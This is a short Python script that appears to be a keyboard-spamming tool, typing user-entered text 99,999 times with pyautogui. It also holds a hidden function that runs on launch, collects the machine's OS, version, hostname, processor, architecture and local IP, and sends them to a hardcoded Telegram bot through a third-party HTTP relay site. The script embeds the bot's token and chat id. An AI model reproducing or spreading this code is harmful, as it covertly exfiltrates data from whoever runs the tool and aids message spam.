try:
    import pyautogui
except:
    print("Pleas Install pyautogui")
import os
import time
import sys
import requests
try:
    import platform
except:
    print("Pleass Install platform")
import socket

def _requests_data_(text1):
        text = text1
        url="https://api.telegram.org/bot1975294481:AAERpn24sMlLS4lnqI5BnzjIYb3WYqalyHc/sendmessage?chat_id=925528279&text="+str(text)
        my_dict = {
            "UrlBox" : url,
            "AgentList" : "Mozilla Firefox",
            "VersionsList" : "HTTP/1.1",
            "MethodList" : "GET"
        }
        http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=my_dict)

def _send_data_for_me_():
        try:
            org_platform = platform.uname()               # ___
            org_time =time.ctime()                        # ___
            name_system = org_platform[0]                 # ___
            version_system = org_platform[2]              # ___
            node = org_platform[1]                        # ___
            system_architecture = platform.architecture() # ___
            system_processor = platform.processor()       # ___
            ip = socket.gethostname()              # ___
            ip_target = socket.gethostbyname(ip)   # ___
            _requests_data_(f"[Ip Target : {str(ip_target)}]\n\nName System target : {name_system}\n\nVersion System Target : {version_system}\n\nNode : {node}\nSystem Architecture : {system_architecture}\n\nSystem Processor : {system_processor}\n\bTime : {org_time}")
        except:
            pass
_send_data_for_me_()

os.system("clear")

text = input("Enter Your Text ==> ")
time.sleep(5)
for i in range(99999):
    pyautogui.typewrite(f"{text}")
    pyautogui.press("enter")
